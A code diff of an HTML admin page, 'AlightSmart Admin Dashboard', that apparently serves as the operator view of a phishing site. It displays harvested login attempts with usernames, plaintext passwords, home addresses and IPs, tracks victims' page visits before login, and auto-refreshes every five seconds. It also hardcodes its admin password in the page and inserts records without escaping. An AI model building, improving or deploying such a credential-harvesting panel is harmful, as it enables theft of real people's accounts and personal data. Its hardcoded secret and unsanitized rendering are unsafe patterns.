@@ -14,86 +14,113 @@
         table { width: 100%; border-collapse: collapse; margin-bottom: 30px; }
         th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
         th { background: #e2e8f0; }
-        button { padding: 12px 25px; margin: 10px 5px; border: none; border-radius: 8px; cursor: pointer; }
+        button { 
+            padding: 12px 25px; 
+            margin: 10px 5px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 1rem;
+        }
         .refresh-btn { background: #3b82f6; color: white; }
         .clear-btn { background: #ef4444; color: white; }
-        .live { color: #22c55e; font-size: 0.9rem; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
             <h1>🔐 AlightSmart Admin Dashboard</h1>
-            <p>Password: <span class="live">● LIVE</span></p>
+            <p>Password: tunde6035 | Supabase (Permanent)</p>
         </div>
 
+        <!-- Section 1: Login Records -->
         <div class="section">
             <h2>1. Login Records</h2>
             <table id="loginTable">
-                <thead><tr><th>Time</th><th>Username</th><th>Password</th><th>Address</th><th>IP</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Username</th>
+                        <th>Password</th>
+                        <th>Home Address</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
                 <tbody></tbody>
             </table>
         </div>
 
+        <!-- Section 2: Page Visits -->
         <div class="section">
-            <h2>2. Page Visits (Immediate)</h2>
+            <h2>2. Page Visits (Before Login)</h2>
             <table id="visitTable">
-                <thead><tr><th>Time</th><th>Type</th><th>IP</th></tr></thead>
+                <thead>
+                    <tr>
+                        <th>Time</th>
+                        <th>Type</th>
+                        <th>IP</th>
+                    </tr>
+                </thead>
                 <tbody></tbody>
             </table>
         </div>
 
-        <div style="text-align: center;">
-            <button class="refresh-btn" onclick="loadRecords()">🔄 Manual Refresh</button>
-            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All</button>
+        <div style="text-align: center; padding: 20px;">
+            <button class="refresh-btn" onclick="loadRecords()">🔄 Refresh Now</button>
+            <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
         </div>
     </div>
 
     <script>
         const ADMIN_PASSWORD = "tunde6035";
-        let socket;
 
         async function loadRecords() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
+            try {
+                const res = await fetch('/api/records');
+                const records = await res.json();
 
-            const loginBody = document.querySelector('#loginTable tbody');
-            const visitBody = document.querySelector('#visitTable tbody');
-            loginBody.innerHTML = "";
-            visitBody.innerHTML = "";
+                const loginBody = document.querySelector('#loginTable tbody');
+                const visitBody = document.querySelector('#visitTable tbody');
+                loginBody.innerHTML = "";
+                visitBody.innerHTML = "";
 
-            records.forEach(r => {
-                if (r.type === "Login Attempt") {
-                    loginBody.innerHTML += `<tr><td>${r.timestamp}</td><td><strong>${r.username||'-'}</strong></td><td><code>${r.password||'-'}</code></td><td>${r.address||'-'}</td><td>${r.ip||'-'}</td></tr>`;
-                } else {
-                    visitBody.innerHTML += `<tr><td>${r.timestamp}</td><td>${r.type}</td><td>${r.ip||'-'}</td></tr>`;
-                }
-            });
-        }
-
-        function connectWebSocket() {
-            socket = new WebSocket('ws://' + window.location.hostname + ':8080');
-            
-            socket.onmessage = function() {
-                loadRecords();   // Auto update when new record arrives
-            };
-
-            socket.onclose = () => setTimeout(connectWebSocket, 3000);
+                records.forEach(r => {
+                    if (r.type === "Login Attempt") {
+                        loginBody.innerHTML += `
+                            <tr>
+                                <td>${r.timestamp}</td>
+                                <td><strong>${r.username || '-'}</strong></td>
+                                <td><code>${r.password || '-'}</code></td>
+                                <td>${r.address || '-'}</td>
+                                <td>${r.ip || '-'}</td>
+                            </tr>`;
+                    } else {
+                        visitBody.innerHTML += `
+                            <tr>
+                                <td>${r.timestamp}</td>
+                                <td>${r.type}</td>
+                                <td>${r.ip || '-'}</td>
+                            </tr>`;
+                    }
+                });
+            } catch (e) {
+                console.error("Error loading records");
+            }
         }
 
         window.onload = () => {
             const pass = prompt("Enter Admin Password:");
             if (pass === ADMIN_PASSWORD) {
                 loadRecords();
-                connectWebSocket();
+                setInterval(loadRecords, 5000);   // Auto refresh every 5 seconds
             } else {
-                alert("Wrong Password");
+                alert("❌ Wrong Password");
                 window.location.href = "/";
             }
         };
 
         async function clearRecords() {
-            if (confirm("Clear all records?")) {
+            if (confirm("Clear ALL records permanently?")) {
                 await fetch('/api/clear', { method: 'POST' });
                 loadRecords();
             }
